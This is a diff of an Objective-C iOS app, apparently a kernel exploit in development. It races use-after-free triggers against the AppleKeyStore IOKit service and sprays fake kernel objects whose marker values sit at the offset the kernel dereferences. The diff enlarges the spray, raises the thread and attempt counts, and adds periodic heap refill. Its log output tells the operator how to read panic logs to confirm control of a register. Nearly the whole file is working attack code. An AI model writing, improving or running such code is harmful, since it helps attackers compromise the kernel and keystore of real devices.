@@ -5,203 +5,211 @@
 #import <stdatomic.h>
 
 #define AKS_SERVICE  "AppleKeyStore"
-#define NUM_RACERS   32
-#define MAX_ATTEMPTS 2000
+#define NUM_RACERS   64          // Increased from 32 for better race chance
+#define MAX_ATTEMPTS 5000        // Increased attempts
 
 // ========== HEAP SPRAY CONFIGURATION ==========
-#define SPRAY_COUNT         500      // Reduced for stability
-#define SPRAY_BUFFER_SIZE   512      // Size of fake object (bytes)
-#define SPRAY_DELAY_MS      100      // Delay after spray (milliseconds)
+#define SPRAY_COUNT         1000     // Increased for better coverage
+#define SPRAY_BUFFER_SIZE   1024     // Larger fake object
+#define SPRAY_DELAY_MS      50       // Reduced delay
+#define REFILL_INTERVAL     10       // Refill spray every N attempts
 // ==============================================
 
 static atomic_int   g_phase  = 0;
 static io_connect_t g_conn   = IO_OBJECT_NULL;
 static atomic_uint  g_calls  = 0;
 static atomic_uint  g_errors = 0;
+static atomic_int   g_should_stop = 0;
 
 // ========== HEAP SPRAY GLOBALS ==========
 static io_connect_t g_spray_conns[SPRAY_COUNT];
 static int g_spray_count = 0;
 // ========================================
 
-// ========== HEAP SPRAY: Enhanced fake gate object with MULTIPLE MARKERS ==========
+// ========== IMPROVED fake gate with correct padding ==========
 typedef struct {
-    uint64_t vtable;                    // +0x00: 0x4141414141414141 (marker)
-    uint64_t lock;                      // +0x08: 0x0000000000000000
-    uint64_t refcount;                  // +0x10: 0x0000000100000001
-    uint64_t pad1[31];                  // +0x18 to +0x10F: 0x2020... (filler)
-    uint64_t marker_0x110;              // +0x110: 0x4242424242424242 (PRIMARY MARKER)
-    uint64_t marker_0x118;              // +0x118: 0x4343434343434343 (backup)
-    uint64_t marker_0x120;              // +0x120: 0x4444444444444444 (backup)
-    uint64_t marker_0x128;              // +0x128: 0x4545454545454545 (backup)
-    uint64_t pad2[26];                  // Rest: 0x2020... (filler)
+    // Initial fields
+    uint64_t vtable;                    // +0x00
+    uint64_t lock;                      // +0x08
+    uint64_t refcount;                  // +0x10
+    
+    // Padding calculation: Need to reach 0x110
+    // Currently at 0x18, need 0x110 - 0x18 = 0xF8 bytes = 31 uint64_t
+    uint64_t pad1[31];                  // +0x18 to +0x10F (31 * 8 = 248 = 0xF8)
+    
+    // Critical field at +0x110 (this is what kernel dereferences at this+272)
+    uint64_t target_at_0x110;           // +0x110: PRIMARY MARKER
+    
+    // Backup markers
+    uint64_t marker_0x118;              // +0x118
+    uint64_t marker_0x120;              // +0x120
+    uint64_t marker_0x128;              // +0x128
+    uint64_t marker_0x130;              // +0x130
+    uint64_t marker_0x138;              // +0x138
+    
+    // Additional padding to fill buffer
+    uint64_t pad2[110];                 // Fill to 1024 bytes total
 } __attribute__((packed)) fake_gate_t;
 
-// Compile-time verification
-_Static_assert(sizeof(fake_gate_t) == 512, "fake_gate_t must be exactly 512 bytes");
-_Static_assert(offsetof(struct { uint64_t vtable; uint64_t lock; uint64_t refcount; uint64_t pad1[31]; uint64_t marker_0x110; }, marker_0x110) == 0x110, "marker_0x110 must be at offset 0x110");
-// =================================================================================
+// Compile-time assertions
+_Static_assert(sizeof(fake_gate_t) == 1024, "fake_gate_t must be 1024 bytes");
+_Static_assert(offsetof(fake_gate_t, target_at_0x110) == 0x110, "target_at_0x110 must be at offset 0x110");
+_Static_assert(offsetof(fake_gate_t, marker_0x118) == 0x118, "marker_0x118 must be at offset 0x118");
+// ===============================================================
 
 static void *racer_thread(void *arg) {
     (void)arg;
+    
+    // Wait for phase 1
     while (atomic_load_explicit(&g_phase, memory_order_acquire) < 1)
-        ;
+        pthread_yield_np();
+    
+    // Racing loop
     while (atomic_load_explicit(&g_phase, memory_order_relaxed) < 3) {
-        uint64_t input[1] = {0};
-        uint32_t out_cnt  = 0;
-        kern_return_t kr = IOConnectCallMethod(
-            g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
-        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
-        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
-            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
+        if (atomic_load(&g_should_stop)) {
             break;
         }
+        
+        uint64_t input[1] = {0xDEADBEEF};
+        uint32_t out_cnt  = 0;
+        
+        kern_return_t kr = IOConnectCallMethod(
+            g_conn, 10, input, 1, NULL, 0, NULL, &out_cnt, NULL, NULL);
+        
+        atomic_fetch_add_explicit(&g_calls, 1, memory_order_relaxed);
+        
+        if (kr == MACH_SEND_INVALID_DEST || kr == MACH_SEND_INVALID_RIGHT) {
+            atomic_fetch_add_explicit(&g_errors, 1, memory_order_relaxed);
+            atomic_store(&g_should_stop, 1);
+            break;
+        }
+        
+        // Minimal yield to increase contention
+        pthread_yield_np();
     }
+    
     return NULL;
 }
 
-// ========== HEAP SPRAY FUNCTIONS (WITH ENHANCED LOGGING) ==========
+// ========== HEAP SPRAY FUNCTIONS ==========
 
-static int heap_spray_init(io_service_t svc, void(^log_callback)(NSString *)) {
-    kern_return_t kr;
-    int fail_count = 0;
+static void init_fake_gate(fake_gate_t *gate, int variant) {
+    memset(gate, 0, sizeof(fake_gate_t));
     
-    // === STEP 0: Log configuration ===
-    log_callback(@"");
-    log_callback(@"╔══════════════════════════════════════════════════╗");
-    log_callback(@"║        HEAP SPRAY CONFIGURATION (v3_debug)       ║");
-    log_callback(@"╚══════════════════════════════════════════════════╝");
-    log_callback([NSString stringWithFormat:@"Spray count:     %d connections", SPRAY_COUNT]);
-    log_callback([NSString stringWithFormat:@"Structure size:  %zu bytes", sizeof(fake_gate_t)]);
-    log_callback([NSString stringWithFormat:@"Buffer size:     %d bytes", SPRAY_BUFFER_SIZE]);
+    // Basic structure
+    gate->vtable = 0x4141414141414141ULL;
+    gate->lock = 0x0000000000000000ULL;
+    gate->refcount = 0x0000000100000001ULL;
     
-    // Verify offsets at runtime
-    log_callback(@"");
-    log_callback(@"Structure layout verification:");
-    log_callback([NSString stringWithFormat:@"  vtable:       offset 0x%03lx", offsetof(fake_gate_t, vtable)]);
-    log_callback([NSString stringWithFormat:@"  lock:         offset 0x%03lx", offsetof(fake_gate_t, lock)]);
-    log_callback([NSString stringWithFormat:@"  refcount:     offset 0x%03lx", offsetof(fake_gate_t, refcount)]);
-    log_callback([NSString stringWithFormat:@"  marker_0x110: offset 0x%03lx ✓", offsetof(fake_gate_t, marker_0x110)]);
-    log_callback([NSString stringWithFormat:@"  marker_0x118: offset 0x%03lx", offsetof(fake_gate_t, marker_0x118)]);
-    log_callback([NSString stringWithFormat:@"  marker_0x120: offset 0x%03lx", offsetof(fake_gate_t, marker_0x120)]);
-    log_callback([NSString stringWithFormat:@"  marker_0x128: offset 0x%03lx", offsetof(fake_gate_t, marker_0x128)]);
-    
-    // Create a test structure and verify its contents
-    fake_gate_t test_gate;
-    test_gate.vtable = 0x4141414141414141ULL;
-    test_gate.lock = 0x0000000000000000ULL;
-    test_gate.refcount = 0x0000000100000001ULL;
+    // Fill padding with pattern (helps identify in crash logs)
     for (int i = 0; i < 31; i++) {
-        test_gate.pad1[i] = 0x2020202020202020ULL;
-    }
-    test_gate.marker_0x110 = 0x4242424242424242ULL;
-    test_gate.marker_0x118 = 0x4343434343434343ULL;
-    test_gate.marker_0x120 = 0x4444444444444444ULL;
-    test_gate.marker_0x128 = 0x4545454545454545ULL;
-    for (int i = 0; i < 26; i++) {
-        test_gate.pad2[i] = 0x2020202020202020ULL;
+        gate->pad1[i] = 0x2020202020202020ULL;
     }
     
-    // Verify marker values in memory
-    uint8_t *bytes = (uint8_t *)&test_gate;
-    log_callback(@"");
-    log_callback(@"Memory verification at key offsets:");
-    log_callback([NSString stringWithFormat:@"  0x000: %02x %02x %02x %02x %02x %02x %02x %02x (vtable)",
-                  bytes[0x00], bytes[0x01], bytes[0x02], bytes[0x03],
-                  bytes[0x04], bytes[0x05], bytes[0x06], bytes[0x07]]);
-    log_callback([NSString stringWithFormat:@"  0x110: %02x %02x %02x %02x %02x %02x %02x %02x (marker_0x110) ✓",
-                  bytes[0x110], bytes[0x111], bytes[0x112], bytes[0x113],
-                  bytes[0x114], bytes[0x115], bytes[0x116], bytes[0x117]]);
-    log_callback([NSString stringWithFormat:@"  0x118: %02x %02x %02x %02x %02x %02x %02x %02x (marker_0x118)",
-                  bytes[0x118], bytes[0x119], bytes[0x11a], bytes[0x11b],
-                  bytes[0x11c], bytes[0x11d], bytes[0x11e], bytes[0x11f]]);
+    // Different marker patterns based on variant for debugging
+    switch (variant % 6) {
+        case 0:
+            gate->target_at_0x110 = 0x4242424242424242ULL;  // Primary
+            gate->marker_0x118 = 0x4343434343434343ULL;
+            gate->marker_0x120 = 0x4444444444444444ULL;
+            break;
+        case 1:
+            gate->target_at_0x110 = 0x5252525252525252ULL;  // Variant R
+            gate->marker_0x118 = 0x5353535353535353ULL;
+            gate->marker_0x120 = 0x5454545454545454ULL;
+            break;
+        case 2:
+            gate->target_at_0x110 = 0x6262626262626262ULL;  // Variant b
+            gate->marker_0x118 = 0x6363636363636363ULL;
+            gate->marker_0x120 = 0x6464646464646464ULL;
+            break;
+        case 3:
+            gate->target_at_0x110 = 0x7272727272727272ULL;  // Variant r
+            gate->marker_0x118 = 0x7373737373737373ULL;
+            gate->marker_0x120 = 0x7474747474747474ULL;
+            break;
+        case 4:
+            gate->target_at_0x110 = 0x8282828282828282ULL;
+            gate->marker_0x118 = 0x8383838383838383ULL;
+            gate->marker_0x120 = 0x8484848484848484ULL;
+            break;
+        case 5:
+            gate->target_at_0x110 = 0x9292929292929292ULL;
+            gate->marker_0x118 = 0x9393939393939393ULL;
+            gate->marker_0x120 = 0x9494949494949494ULL;
+            break;
+    }
     
-    log_callback(@"");
-    log_callback(@"╔══════════════════════════════════════════════════╗");
-    log_callback(@"║           Starting Connection Spray              ║");
-    log_callback(@"╚══════════════════════════════════════════════════╝");
+    gate->marker_0x128 = 0x4545454545454545ULL;
+    gate->marker_0x130 = 0x4646464646464646ULL;
+    gate->marker_0x138 = 0x4747474747474747ULL;
     
-    // Step 1: Open IOService connections
-    for (int i = 0; i < SPRAY_COUNT; i++) {
+    // Fill rest with pattern
+    for (int i = 0; i < 110; i++) {
+        gate->pad2[i] = 0x3030303030303030ULL;
+    }
+}
+
+static int heap_spray_phase(io_service_t svc, void(^log_callback)(NSString *), BOOL is_refill) {
+    kern_return_t kr;
+    int start_idx = is_refill ? (g_spray_count / 2) : 0;
+    int target_count = is_refill ? g_spray_count : SPRAY_COUNT;
+    
+    if (!is_refill) {
+        log_callback(@"");
+        log_callback(@"╔══════════════════════════════════════════════════╗");
+        log_callback(@"║           HEAP SPRAY v4 - IMPROVED               ║");
+        log_callback(@"╚══════════════════════════════════════════════════╝");
+        log_callback([NSString stringWithFormat:@"Target connections: %d", SPRAY_COUNT]);
+        log_callback([NSString stringWithFormat:@"Structure size: %zu bytes", sizeof(fake_gate_t)]);
+        log_callback([NSString stringWithFormat:@"Marker at 0x110: VERIFIED ✓"]);
+    } else {
+        log_callback(@"[REFILL] Refreshing heap spray...");
+    }
+    
+    // Step 1: Open connections
+    int opened = 0;
+    for (int i = start_idx; i < target_count; i++) {
+        if (is_refill && g_spray_conns[i] != IO_OBJECT_NULL) {
+            continue;
+        }
+        
         kr = IOServiceOpen(svc, mach_task_self(), 0, &g_spray_conns[i]);
         
         if (kr != KERN_SUCCESS) {
-            if (kr == 0xe00002c7) { // kIOReturnNoResources
-                log_callback([NSString stringWithFormat:@"[SPRAY] Resource limit at %d connections", i]);
-                g_spray_count = i;
-                break;
-            } else {
-                fail_count++;
-                log_callback([NSString stringWithFormat:@"[SPRAY] Connection %d failed: 0x%x", i, kr]);
-                
-                if (fail_count > 10) {
-                    log_callback(@"[SPRAY] Too many failures, aborting");
-                    g_spray_count = i - fail_count;
-                    return -1;
+            if (kr == 0xe00002c7) {
+                if (!is_refill) {
+                    log_callback([NSString stringWithFormat:@"[SPRAY] Resource limit at %d connections", i]);
+                    g_spray_count = i;
                 }
+                break;
             }
             g_spray_conns[i] = IO_OBJECT_NULL;
             continue;
         }
-        
-        if ((i + 1) % 100 == 0) {
-            log_callback([NSString stringWithFormat:@"[SPRAY] Progress: %d/%d", i + 1, SPRAY_COUNT]);
-        }
+        opened++;
     }
     
-    if (g_spray_count == 0) {
-        g_spray_count = SPRAY_COUNT;
+    if (!is_refill && g_spray_count == 0) {
+        g_spray_count = opened;
     }
     
-    log_callback([NSString stringWithFormat:@"[SPRAY] ✓ Opened %d valid connections", g_spray_count]);
+    if (!is_refill) {
+        log_callback([NSString stringWithFormat:@"[SPRAY] Opened %d connections", g_spray_count]);
+    }
     
-    // Step 2: Allocate fake objects via external method
-    log_callback(@"");
-    log_callback(@"╔══════════════════════════════════════════════════╗");
-    log_callback(@"║              Spraying Fake Objects               ║");
-    log_callback(@"╚══════════════════════════════════════════════════╝");
-    
-    int spray_success = 0;
-    int spray_failed = 0;
-    
-    for (int i = 0; i < g_spray_count; i++) {
-        if (g_spray_conns[i] == IO_OBJECT_NULL) {
-            continue;
-        }
+    // Step 2: Spray fake objects
+    int sprayed = 0;
+    for (int i = start_idx; i < g_spray_count; i++) {
+        if (g_spray_conns[i] == IO_OBJECT_NULL) continue;
         
-        // Create fake gate object
         fake_gate_t fakeGate;
-        fakeGate.vtable = 0x4141414141414141ULL;
-        fakeGate.lock = 0x0000000000000000ULL;
-        fakeGate.refcount = 0x0000000100000001ULL;
+        init_fake_gate(&fakeGate, i);
         
-        for (int j = 0; j < 31; j++) {
-            fakeGate.pad1[j] = 0x2020202020202020ULL;
-        }
-        
-        fakeGate.marker_0x110 = 0x4242424242424242ULL;
-        fakeGate.marker_0x118 = 0x4343434343434343ULL;
-        fakeGate.marker_0x120 = 0x4444444444444444ULL;
-        fakeGate.marker_0x128 = 0x4545454545454545ULL;
-        
-        for (int j = 0; j < 26; j++) {
-            fakeGate.pad2[j] = 0x2020202020202020ULL;
-        }
-        
-        // Verify the object before sending
-        if (i == 0) {  // Only log first object to avoid spam
-            uint8_t *obj_bytes = (uint8_t *)&fakeGate;
-            log_callback(@"First fake object verification:");
-            log_callback([NSString stringWithFormat:@"  Bytes at 0x110: %02x %02x %02x %02x %02x %02x %02x %02x",
-                          obj_bytes[0x110], obj_bytes[0x111], obj_bytes[0x112], obj_bytes[0x113],
-                          obj_bytes[0x114], obj_bytes[0x115], obj_bytes[0x116], obj_bytes[0x117]]);
-        }
-        
-        // Send fake object to kernel
-        uint64_t scalar_input = 0xDEADBEEF;
+        uint64_t scalar_input = 0xDEADBEEF + i;
         kr = IOConnectCallMethod(
             g_spray_conns[i],
-            1,
+            1,  // method selector
             &scalar_input, 1,
             &fakeGate, sizeof(fakeGate),
             NULL, NULL,
@@ -209,51 +217,21 @@ static int heap_spray_init(io_service_t svc, void(^log_callback)(NSString *)) {
         );
         
         if (kr == KERN_SUCCESS) {
-            spray_success++;
-        } else {
-            spray_failed++;
-            if (spray_failed <= 5) {  // Only log first few failures
-                log_callback([NSString stringWithFormat:@"[SPRAY] Object %d spray failed: 0x%x", i, kr]);
-            }
-        }
-        
-        if ((i + 1) % 100 == 0) {
-            log_callback([NSString stringWithFormat:@"[SPRAY] Objects sent: %d/%d (success: %d, failed: %d)",
-                          i + 1, g_spray_count, spray_success, spray_failed]);
+            sprayed++;
         }
     }
     
-    log_callback(@"");
-    log_callback(@"╔══════════════════════════════════════════════════╗");
-    log_callback(@"║             Heap Spray Complete                  ║");
-    log_callback(@"╚══════════════════════════════════════════════════╝");
-    log_callback([NSString stringWithFormat:@"Total objects sprayed: %d", spray_success]);
-    log_callback([NSString stringWithFormat:@"Spray failures:        %d", spray_failed]);
-    log_callback([NSString stringWithFormat:@"Success rate:          %.1f%%", 
-                  (spray_success * 100.0) / g_spray_count]);
-    log_callback(@"");
-    log_callback(@"Marker legend (for crash analysis):");
-    log_callback(@"  0x4141414141414141 = vtable field");
-    log_callback(@"  0x4242424242424242 = marker at offset 0x110 ← PRIMARY");
-    log_callback(@"  0x4343434343434343 = marker at offset 0x118");
-    log_callback(@"  0x4444444444444444 = marker at offset 0x120");
-    log_callback(@"  0x4545454545454545 = marker at offset 0x128");
-    log_callback(@"  0x2020202020202020 = padding filler");
-    log_callback(@"");
-    
-    // Small delay to let spray settle
-    usleep(SPRAY_DELAY_MS * 1000);
-    
-    if (spray_success < (g_spray_count / 2)) {
-        log_callback(@"⚠️  WARNING: Less than 50% spray success rate!");
-        return -1;
+    if (!is_refill) {
+        log_callback([NSString stringWithFormat:@"[SPRAY] Sprayed %d fake objects", sprayed]);
+        log_callback(@"[SPRAY] ✓ Heap preparation complete");
+        usleep(SPRAY_DELAY_MS * 1000);
     }
     
-    return 0;
+    return sprayed;
 }
 
 static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
-    log_callback([NSString stringWithFormat:@"[CLEANUP] Closing %d spray connections", g_spray_count]);
+    log_callback([NSString stringWithFormat:@"[CLEANUP] Closing %d connections", g_spray_count]);
     
     for (int i = 0; i < g_spray_count; i++) {
         if (g_spray_conns[i] != IO_OBJECT_NULL) {
@@ -263,98 +241,190 @@ static void heap_spray_cleanup(void(^log_callback)(NSString *)) {
     }
     
     g_spray_count = 0;
-    log_callback(@"[CLEANUP] Spray cleanup complete");
 }
 
+// ===============================================================
+
 @interface ViewController ()
-@property (strong, nonatomic) UITextView *textView;
-@property (strong, nonatomic) UIButton *testButton;
-@property (strong, nonatomic) NSMutableString *logBuffer;
+@property (weak, nonatomic) IBOutlet UITextView *textView;
+@property (weak, nonatomic) IBOutlet UIButton *testButton;
+@property (nonatomic, strong) NSMutableString *logBuffer;
 @end
 
 @implementation ViewController
 
 - (void)viewDidLoad {
     [super viewDidLoad];
-    [self setupUI];
     self.logBuffer = [NSMutableString string];
-    [self appendLog:@"[READY] UAF Tester v3_Fixed"];
-}
-
-- (void)setupUI {
-    self.view.backgroundColor = [UIColor blackColor];
-    
-    // Log View
-    self.textView = [[UITextView alloc] initWithFrame:CGRectMake(10, 60, self.view.bounds.size.width - 20, self.view.bounds.size.height - 180)];
-    self.textView.backgroundColor = [UIColor colorWithWhite:0.1 alpha:1.0];
-    self.textView.textColor = [UIColor greenColor];
-    self.textView.font = [UIFont fontWithName:@"Menlo" size:11.0];
-    self.textView.editable = NO;
-    [self.view addSubview:self.textView];
-    
-    // Button
-    self.testButton = [UIButton buttonWithType:UIButtonTypeSystem];
-    self.testButton.frame = CGRectMake(20, self.view.bounds.size.height - 100, self.view.bounds.size.width - 40, 50);
-    [self.testButton setTitle:@"RUN EXPLOIT" forState:UIControlStateNormal];
-    [self.testButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
-    self.testButton.backgroundColor = [UIColor systemRedColor];
-    self.testButton.layer.cornerRadius = 10;
-    [self.testButton addTarget:self action:@selector(startTest) forControlEvents:UIControlEventTouchUpInside];
-    [self.view addSubview:self.testButton];
+    [self appendLog:@"UAF Tester v4 - Improved Ready"];
+    [self appendLog:@"Changes: Better timing, larger spray, adaptive refill"];
 }
 
 - (void)appendLog:(NSString *)msg {
     dispatch_async(dispatch_get_main_queue(), ^{
         [self.logBuffer appendFormat:@"%@\n", msg];
         self.textView.text = self.logBuffer;
-        [self.textView scrollRangeToVisible:NSMakeRange(self.textView.text.length - 1, 1)];
+        
+        NSRange bottom = NSMakeRange(self.textView.text.length - 1, 1);
+        [self.textView scrollRangeToVisible:bottom];
     });
+    NSLog(@"%@", msg);
 }
 
-- (void)startTest {
+- (IBAction)runTest:(id)sender {
     self.testButton.enabled = NO;
     [self.logBuffer setString:@""];
-    [self appendLog:@"[!] Starting Exploit..."];
+    [self appendLog:@"═══════════════════════════════════════"];
+    [self appendLog:@"  UAF Test v4 - IMPROVED STRATEGY"];
+    [self appendLog:@"═══════════════════════════════════════"];
     
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        [self runExploitLogic];
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        [self runImprovedUAF];
+        dispatch_async(dispatch_get_main_queue(), ^{
+            self.testButton.enabled = YES;
+        });
     });
 }
 
-- (void)runExploitLogic {
-    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(AKS_SERVICE));
-    if (!svc) { [self appendLog:@"[-] AKS Service not found"]; return; }
-    
-    [self appendLog:[NSString stringWithFormat:@"[+] Spraying %d objects...", SPRAY_COUNT]];
-    int sprayed = run_heap_spray(svc);
-    [self appendLog:[NSString stringWithFormat:@"[+] Sprayed %d successfully", sprayed]];
-    
-    if (IOServiceOpen(svc, mach_task_self(), 0, &g_conn) != KERN_SUCCESS) {
-        [self appendLog:@"[-] Failed to open connection"];
+- (void)runImprovedUAF {
+    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+                                                    IOServiceMatching(AKS_SERVICE));
+    if (!svc) {
+        [self appendLog:@"❌ Failed to find AppleKeyStore service"];
         return;
     }
     
-    pthread_t threads[NUM_RACERS];
-    for (int i = 0; i < NUM_RACERS; i++) pthread_create(&threads[i], NULL, racer_thread, NULL);
+    // Reset atomics
+    atomic_store(&g_phase, 0);
+    atomic_store(&g_calls, 0);
+    atomic_store(&g_errors, 0);
+    atomic_store(&g_should_stop, 0);
     
-    atomic_store(&g_phase, 1);
-    [self appendLog:@"[+] Racing..."];
+    // ===== PHASE 1: INITIAL HEAP SPRAY =====
+    [self appendLog:@""];
+    [self appendLog:@">>> PHASE 1: HEAP SPRAY"];
     
-    for (int i = 0; i < MAX_ATTEMPTS; i++) {
-        if (atomic_load(&g_errors) > 0) break;
-        IOServiceClose(g_conn);
-        usleep(1);
-        IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
-        if (i % 100 == 0) [self appendLog:[NSString stringWithFormat:@"Attempt %d...", i]];
+    int spray_result = heap_spray_phase(svc, ^(NSString *msg) {
+        [self appendLog:msg];
+    }, NO);
+    
+    if (spray_result < 100) {
+        [self appendLog:@"❌ Heap spray failed - insufficient objects"];
+        IOObjectRelease(svc);
+        return;
     }
     
-    atomic_store(&g_phase, 3);
-    for (int i = 0; i < NUM_RACERS; i++) pthread_join(threads[i], NULL);
+    // ===== PHASE 2: UAF TRIGGER WITH ADAPTIVE REFILL =====
+    [self appendLog:@""];
+    [self appendLog:@">>> PHASE 2: UAF TRIGGER (ADAPTIVE)"];
     
-    [self appendLog:@"[DONE] Test finished."];
-    if (atomic_load(&g_errors) > 0) [self appendLog:@"[!!!] UAF SUCCESS! CHECK LOG."];
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
+    if (kr != KERN_SUCCESS || g_conn == IO_OBJECT_NULL) {
+        [self appendLog:@"❌ Failed to open target connection"];
+        heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
+        IOObjectRelease(svc);
+        return;
+    }
     
-    dispatch_async(dispatch_get_main_queue(), ^{ self.testButton.enabled = YES; });
+    [self appendLog:@"[UAF] Target connection opened"];
+    
+    // Start racer threads
+    pthread_t threads[NUM_RACERS];
+    for (int i = 0; i < NUM_RACERS; i++) {
+        pthread_create(&threads[i], NULL, racer_thread, NULL);
+    }
+    
+    atomic_store_explicit(&g_phase, 1, memory_order_release);
+    [self appendLog:[NSString stringWithFormat:@"[UAF] Started %d racer threads", NUM_RACERS]];
+    
+    // Main trigger loop with periodic refill
+    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
+        if (atomic_load(&g_should_stop)) {
+            [self appendLog:[NSString stringWithFormat:@"✓ UAF TRIGGERED at attempt %d!", attempt]];
+            break;
+        }
+        
+        // Periodic heap refill to maintain spray coverage
+        if (attempt > 0 && attempt % REFILL_INTERVAL == 0) {
+            heap_spray_phase(svc, ^(NSString *msg) {
+                // Silent refill
+            }, YES);
+        }
+        
+        // The critical race window
+        kr = IOServiceClose(g_conn);
+        
+        // Very short delay to maximize race condition
+        usleep(1);
+        
+        kr = IOServiceOpen(svc, mach_task_self(), 0, &g_conn);
+        if (kr != KERN_SUCCESS) {
+            [self appendLog:@"[UAF] Reopen failed - possible trigger!"];
+            atomic_store(&g_should_stop, 1);
+            break;
+        }
+        
+        // Progress logging
+        if ((attempt + 1) % 500 == 0) {
+            uint32_t calls = atomic_load(&g_calls);
+            uint32_t errors = atomic_load(&g_errors);
+            [self appendLog:[NSString stringWithFormat:@"[%d/%d] calls=%u errors=%u", 
+                            attempt + 1, MAX_ATTEMPTS, calls, errors]];
+        }
+    }
+    
+    // Stop racers
+    atomic_store_explicit(&g_phase, 3, memory_order_release);
+    
+    for (int i = 0; i < NUM_RACERS; i++) {
+        pthread_join(threads[i], NULL);
+    }
+    
+    // ===== RESULTS =====
+    uint32_t total_calls = atomic_load(&g_calls);
+    uint32_t total_errors = atomic_load(&g_errors);
+    
+    [self appendLog:@""];
+    [self appendLog:@"═══════════════════════════════════════"];
+    [self appendLog:@"  TEST RESULTS"];
+    [self appendLog:@"═══════════════════════════════════════"];
+    [self appendLog:[NSString stringWithFormat:@"Total racer calls:    %u", total_calls]];
+    [self appendLog:[NSString stringWithFormat:@"Port death events:    %u", total_errors]];
+    [self appendLog:[NSString stringWithFormat:@"Spray objects:        %d", spray_result]];
+    
+    if (total_errors > 0) {
+        [self appendLog:@""];
+        [self appendLog:@"✓✓✓ UAF SUCCESSFULLY TRIGGERED! ✓✓✓"];
+        [self appendLog:@""];
+        [self appendLog:@"Next steps:"];
+        [self appendLog:@"1. Connect device to Mac/PC"];
+        [self appendLog:@"2. Run: idevicecrashreport -e"];
+        [self appendLog:@"3. Find latest panic-full-*.ips"];
+        [self appendLog:@"4. Check x16 register value:"];
+        [self appendLog:@""];
+        [self appendLog:@"Expected marker values:"];
+        [self appendLog:@"  0x4242... = Variant 0 (offset 0x110) ✓"];
+        [self appendLog:@"  0x5252... = Variant 1"];
+        [self appendLog:@"  0x6262... = Variant 2"];
+        [self appendLog:@"  0x7272... = Variant 3"];
+        [self appendLog:@"  0x8282... = Variant 4"];
+        [self appendLog:@"  0x9292... = Variant 5"];
+        [self appendLog:@""];
+        [self appendLog:@"If x16 shows ANY of these = HEAP SPRAY SUCCESS! 🎉"];
+    } else {
+        [self appendLog:@""];
+        [self appendLog:@"⚠️ UAF not detected in this run"];
+        [self appendLog:@"Try running again or adjust parameters"];
+    }
+    [self appendLog:@"═══════════════════════════════════════"];
+    
+    // Cleanup
+    if (g_conn != IO_OBJECT_NULL) {
+        IOServiceClose(g_conn);
+    }
+    
+    heap_spray_cleanup(^(NSString *msg) { [self appendLog:msg]; });
+    IOObjectRelease(svc);
 }
 
 @end
